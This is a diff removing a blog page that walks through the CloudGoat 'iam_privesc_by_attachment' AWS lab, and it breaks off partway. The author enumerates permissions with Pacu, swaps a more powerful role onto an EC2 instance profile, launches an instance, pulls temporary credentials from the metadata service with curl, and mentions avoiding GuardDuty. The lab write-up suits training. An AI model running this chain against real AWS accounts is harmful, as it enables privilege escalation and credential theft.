@@ -1,469 +1,124 @@
-<!doctype html><html lang=en>
-<head>
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
-<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-133811886-2')</script>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta http-equiv=x-ua-compatible content="IE=edge">
-<script src=/js/nav.js></script>
-<link rel="shortcut icon" href=/favicon.ico>
-<link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css integrity=sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T crossorigin=anonymous>
-<link rel=stylesheet href=/css/main.css>
-<title>
-iam_privesc_by_attachment | jellyparks
-</title>
-</head>
-<body>
-<header>
-</header>
-<div class=site-wrapper>
-<div class="sticky top-bar">
-<div id=mySidenav class=sidenav include-nav=/nav.html>
-</div>
-<span class="sticky hamburger" style=font-size:30px;cursor:pointer onclick=openNav()>&#9776;</span>
-</div>
-<div class=container>
-<div class=blog-header>
-<h1>iam_privesc_by_attachment</h1>
-</div>
-<div class=row>
-<div class="col-sm-8 blog-main">
-<div class=blog-post>
-<hr>
-<p>Once the scenario is creation process completes we are presented with a set of access keys for a user account &lsquo;kerrigan&rsquo;</p>
-<p><img src=images/initial-user.png alt="Initial User" class=img-fluid></p>
-<hr>
-<h2 id=whoami>whoami</h2>
-<p>First lets make sure the credentials that we have obtained are valid:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws sts get-caller-identity --profile xxx |jq
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/whoami.png alt=whoami class=img-fluid></p>
-<p>Perfect, looks like the credentials work. Now, what can they do?</p>
-<hr>
-<h3 id=what-can-i-do>What can I do?</h3>
-<p>Lets use pacu to brute force some permissions. We can do this by running:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>run iam__bruteforce_permissions
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/brute-force-perms.png alt=brute_force class=img-fluid></p>
-<p>Once the command completes we see the output below:</p>
-<p><img src=images/brute-force-output.png alt=brute_force_output class=img-fluid></p>
-<p>Overall the credentials are fairly limited. But it does look like we have the ability to learn about ec2 instances with the describe command. Lets bounce back to the aws cli and run:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws ec2 describe-instances |jq
-</code></pre></td></tr></table>
-</div>
-</div><p>We get an output thatshows us details about the instances within the us-east region of this account. Lets clean this up a little bit just for fun.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile kerrigan ec2 describe-instances |jq -r <span style=color:#0c6>&#39;.Reservations[0].Instances[].InstanceId,.Reservations[0].Instances[].SecurityGroups[].GroupName,.Reservations[0].Instances[].NetworkInterfaces[].Association[]&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>*<em>Note in the command above I set the Reservations to the value in the first index. To see all instances leave the brackets empty &lsquo;[]'</em></p>
-<p>This cleans up the verbose output and prints the instance id, security groups, and some networking details about the instance</p>
-<p><img src=images/jq-fun.png alt=jq_fun class=img-fluid></p>
-<p>Lets see what else our permissions can do. We&rsquo;ll start with the instance profiles command. According to Pacu we have rights to invoke this command.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws iam list-instance-profiles |jq
-</code></pre></td></tr></table>
-</div>
-</div><p>Looking at the output below we see a profile with the &lsquo;cg-ec2-meek-role&rsquo; associated with it.</p>
-<p><img src=images/iam-list-profiles.png alt=iam_list_profiles class=img-fluid></p>
-<p>Lets use pacu to see what instances,security groups, vpcs, and subnets exist within the environment:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>run ec2__enum --region<span style=color:#2c5dcd>=</span>us-east-1
-</code></pre></td></tr></table>
-</div>
-</div><p>Looking at the output we can see that there are currently 4 instances in the region as well as additional information that may become useful.</p>
-<p><img src=images/ec2-enum.png alt=ec2_enum class=img-fluid></p>
-<p>Within Pacu running the <code>data</code> command will dump all of the data from the current session. This will include all of the details we just enumerated about the EC2&rsquo;s within the account.</p>
-<p>Lets head back to the aws cli and run the ec2 describe call again. This time instead of jq we will just print the output to a table.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile kerrigan ec2 describe-instances --output table
-</code></pre></td></tr></table>
-</div>
-</div><p>Looking at the output we can see that there is an ec2 and one of the <code>tags</code> is that it is a <code>super critical server</code>.</p>
-<p><img src=images/super-critical-tag.png alt=critical_ec2_enum class=img-fluid></p>
-<hr>
-<h3 id=more-enumeration>More Enumeration</h3>
-<p>Considering everything that we&rsquo;ve seen up to this point:</p>
-<ul>
-<li>A critical instance exists</li>
-<li>We can perform several ec2 tasks</li>
-<li>We do have some limited iam rights</li>
-</ul>
-<p>There seems to be some potential for us to create an instance. Lets use Pacu to see if we have any additional iam permissions that could be of use.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>run iam__enum_users_roles_policies_groups
-</code></pre></td></tr></table>
-</div>
-</div><p>In the output below it looks like we do not have permissions to make the: <code>list_users, list_groups, or list_policies calls</code>. We do however have permissions to list roles within the account.</p>
-<p><img src=images/iam-permission-failure.png alt=iam_enum class=img-fluid></p>
-<p>Lets dig into those a big more. This can be done by either running the <code>data</code> command from within Pacu or by running the following command via the aws cli:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile kerrigan iam list-roles | jq <span style=color:#0c6>&#39;.Roles[].RoleName&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/account-iam-roles.png alt=iam_roles class=img-fluid></p>
-<p>Considering the role we saw associated with the ec2 instance earlier was called <code>meek</code> it&rsquo;s interesting to see another role with the name of <code>mightly</code>. Lets dig into that a bit more. Instead of making another <code>iam list-role</code>s call to AWS, lets just use the existing <code>data</code> within Pacu by running the data command.</p>
-<p><img src=images/mighty-role.png alt=mighty_role class=img-fluid></p>
-<p>In the picture above we can see that the <code>mighty</code> role is a role associated with the ec2 service. This is a role that can be associated with an ec2 profile, and the profile can be associated with an ec2 instance.</p>
-<p>Considering we have permissions into describing instalnce profile associates, perhaps we also have the ability to associate different roles to a profile. Lets see if we can attach the mighty role to the ec2 profile</p>
-<p>Only one role can be associated with an ec2 instance profile at a time. To begin we will see if we can remove the existing meek role from the profile. We need to pieces of information in order to remove a role from an instance profile. The role name we want to remove, and the profile we want to remove it from. Luckily we know both of those bits of information from our enumeration.</p>
-<ul>
-<li>Role: cg-ec2-meek-role-cgidawtm15fqxm</li>
-<li>Profile: cg-ec2-meek-instance-profile-cgidawtm15fqxm</li>
-</ul>
-<pre tabindex=0><code>aws --profile kerrigan iam remove-role-from-instance-profile --instance-profile-name=cg-ec2-meek-instance-profile-cgidawtm15fqxm --role-name=cg-ec2-meek-role-cgidawtm15fqxm
-</code></pre><p>If the command is successful, there will be no output, if it fails, it squawks. We can confirm it as successful by running the list-instance-profiles command again.</p>
-<p><img src=images/instance-profile-no-role.png alt=no_role class=img-fluid></p>
-<p>In the output above we see the <code>meek</code> instance profile with no roles associated with it. Great! Now lets try associating the <code>mighty</code> role with the <code>meek</code> instance profile. In order to do this we need two pieces of information, the role name, and the instance profile name.</p>
-<ul>
-<li>Role: cg-ec2-mighty-role-cgidawtm15fqxm</li>
-<li>Profile: cg-ec2-meek-instance-profile-cgidawtm15fqxm</li>
-</ul>
-<pre tabindex=0><code>aws --profile kerrigan iam add-role-to-instance-profile --instance-profile-name=cg-ec2-meek-instance-profile-cgidawtm15fqxm --role-name=cg-ec2-mighty-role-cgidawtm15fqxm
-</code></pre><p>Similar to the output when we removed the role from the profile, there will be no output if successful. However running the <code>list-instance-profiles</code> command again we can see that the <code>mighty</code> role has been associated with the <code>meek</code> instance profile.</p>
-<p><img src=images/meek-profile-mighty-role.png alt=no_role class=img-fluid></p>
-<p>Perfect! We now have the mighty role associated with the meek profile.</p>
-<hr>
-<h3 id=make-an-ec2>Make an ec2</h3>
-<p>Lets create our own ec2 and see if we can associate the meek instance profile with the now might role attached to an ec2 instance that we can gain access to. In order to create an ec2 we need several pieces of information:</p>
-<ul>
-<li>ssh key</li>
-<li>security group ids</li>
-<li>subnet id</li>
-<li>image-id</li>
-<li>instance-type</li>
-</ul>
-<p>First we need a key pair the command below will create the ssh key named <code>totes-legit</code>, parses it with jq to just show the key details, and then sends the output into a file called totes-legit:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile kerrigan ec2 create-key-pair --key-name totes-legit |jq -r <span style=color:#0c6>&#39;.KeyMaterial&#39;</span> &gt; ~/.ssh/totes-legit
-</code></pre></td></tr></table>
-</div>
-</div><p>Next we need to find a security group that fits our needs, or see if we can build our own. After all what use is an instane if we cannot connect to it. We can use data from Pacu or we can make another call to aws</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile kerrigan ec2 describe-security-groups
-</code></pre></td></tr></table>
-</div>
-</div><p>Looking at the output we can see that there is already a group that fits our needs, it allows SSH from an IP address that we have access to.</p>
-<p><img src=images/ssh-security-group.png alt=security_group class=img-fluid></p>
-<p>We know that the super critical server has a public IP address, we also have the subnet for that instance. We can use that subnet-id when we create our new instance.</p>
-<p><img src=images/ec2-subnet.png alt=ec2_subnet class=img-fluid></p>
-<p>At this point We have all of the pieces that we need to create an instance that we will have access to (hopefully).</p>
-<ul>
-<li>ssh key: totes-legit</li>
-<li>security group ids: sg-0594794cf09e47456</li>
-<li>subnet id: subnet-0157cfe78e8beca7a</li>
-<li>image-id: ami-0a313d6098716f372</li>
-<li>instance-type: t2.micro</li>
-<li>Time to create an instance:</li>
-</ul>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile kerrigan ec2 run-instances --image-id<span style=color:#2c5dcd>=</span>ami-0a313d6098716f372 --count<span style=color:#2c5dcd>=</span><span style=color:#5918bb;font-weight:700>1</span> --instance-type<span style=color:#2c5dcd>=</span>t2.micro --security-group-ids<span style=color:#2c5dcd>=</span>subnet-01a29bf90aca8c8d9 --subnet-id<span style=color:#2c5dcd>=</span>subnet-0157cfe78e8beca7a --key-name<span style=color:#2c5dcd>=</span>totes-legit --tags Key<span style=color:#2c5dcd>=</span>Name,Value<span style=color:#2c5dcd>=</span>totes-legit
-</code></pre></td></tr></table>
-</div>
-</div><p>When this is successful all of the data bout our instance is returned. This includes our instance id, ip information, and current state. and returns our instance id.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#0c6>&#34;InstanceId&#34;</span>: <span style=color:#0c6>&#34;i-06f3f5f9f8cdc9c6e&#34;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/instance-provisioning.png alt=ec2_provision class=img-fluid></p>
-<p>Unfortunatly, we don&rsquo;t seem to have a public IP address for our instance. Did something go wrong? Nope, the current stat of the instance was &lsquo;pending&rsquo;. We need to check back in on the instance an wait for the state to change to &lsquo;running&rsquo;. Once its running, we should also have public IP address information. We can do this with the <code>describe-instances</code> command.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile kerrigan ec2 describe-instances --instance-id<span style=color:#2c5dcd>=</span>i-06f3f5f9f8cdc9c6e
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/ec2-running.png alt=ec2_running class=img-fluid></p>
-<p>The output from the command in the picture above shows that the instance is &lsquo;running&rsquo; and that we have a public IP.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#0c6>&#34;PublicIpAddress&#34;</span>: <span style=color:#0c6>&#34;18.232.65.212&#34;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Now we can ssh into the box using our totes-legit key:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ssh -i ~/.ssh/totes-legit ubuntu@18.232.65.212
-</code></pre></td></tr></table>
-</div>
-</div><p>Now we can query the meta data service and extract the instance keys, or we could run commands directly through this ec2. Lets grab the keys.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl http://169.254.169.254/latest/meta-data/iam/
-</code></pre></td></tr></table>
-</div>
-</div><p>Weird, looking at the output below we get a 404 error and no access keys. What could cause that?</p>
-<p><img src=images/404-iam.png alt=404_iam class=img-fluid></p>
-<hr>
-<h3 id=more-power>More Power</h3>
-<p>Looking back at what we&rsquo;ve done.</p>
-<ul>
-<li>We found an instance profile</li>
-<li>We disassociated a role with the instance profile</li>
-<li>We associated a new role with the instance profile</li>
-<li>We created an ec2 instance that we have access to.</li>
-</ul>
-<p>Something we have not done yet, associate an instance profile with our instance. This profile is how our instance gains privileges. Remeber, an ec2 can have an instance profile associated with it. That profile can have 1 role associated with it, and that role can have policies attached to it.</p>
-<p>Lets assign a profile to our instance. We&rsquo;ll need our <code>instance Id</code>, and the <code>meek-instance</code> profile name we discovered earlier.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile kerrigan ec2 associate-iam-instance-profile --instance-id<span style=color:#2c5dcd>=</span>i-06f3f5f9f8cdc9c6e --iam-instance-profile Name<span style=color:#2c5dcd>=</span>cg-ec2-meek-instance-profile-cgidawtm15fqxm
-</code></pre></td></tr></table>
-</div>
-</div><p>Once the command is executed we&rsquo;ll see an output similar to the one below with a state of <code>associating</code></p>
-<p><img src=images/associate-profile.png alt=associate_profile class=img-fluid></p>
-<p>After a minute or two we can check back in on our instsance and attempt to curl for credentials again:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl http://169.254.169.254/latest/meta-data/iam/
-</code></pre></td></tr></table>
-</div>
-</div><p>The output has changed, from a 404 error to the one below.</p>
-<p><img src=images/curl-iam.png alt=curl_iam class=img-fluid></p>
-<p>Digging deeper into the meta data we can find an AccessKey, SecretAcessKey, and a Token needed to access the aws api</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-mighty-role-cgidawtm15fqxm
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/access-key.png alt=access_key class=img-fluid></p>
-<p>We have a few options at this point:</p>
-<ul>
-<li>Take the access key information and run aws cli commands from our workstation</li>
-<li>Install/use the aws cli on the instance we control to run commands</li>
-<li>Use the pacu proxy</li>
-</ul>
-<p>Each of these has there own benefits and draw backs. If we steal the keys and use them locally, we run the risk of triggering Guard Duty. We could spin up an ec2 in our own account to prevent Guard Duty from alerting, but thats not necessary for this walkthrough. If we install the aws cli and issue commands we run the risk of losing access to the box. The same issue presents itself if we use the Pacu proxy.</p>
-<p>We&rsquo;ll go ahead and run the risk of losing access, and install the aws cli on our instance.</p>
-<p>Once its install we can validate that we have working credentials:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sts get-caller-identity
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/ec2-whoami.png alt=ec2_whoami class=img-fluid></p>
-<p>Perfect we have no pivoted from the <code>kerrigan</code> user to whatever permissions we have through the new mighty role. We should use our new abilities to see if we can determine the full extent of the <code>mighty</code> role.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws iam list-attached-role-policies --role-name<span style=color:#2c5dcd>=</span>cg-ec2-mighty-role-cgidawtm15fqxm
-</code></pre></td></tr></table>
-</div>
-</div><p>and thankfully, it looks like we have some measure of IAM privileges because the output from that command shows us the policy associated with the role:</p>
-<p><img src=images/mighty-policies.png alt=mighty_polices class=img-fluid>
-Perhaps we have the ability to also see the configuration of that policy. Fist we&rsquo;ll pull in some general information about the policy:</p>
-<pre tabindex=0><code>aws iam get-policy --policy-arn=arn:aws:iam:::policy/cg-ec2-mighty-policy
-</code></pre><p><img src=images/policy-version.png alt=policy_version class=img-fluid></p>
-<p>Looking at the output above we are currently using policy version v1.</p>
-<p>We can now get the configuration of the policy with:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
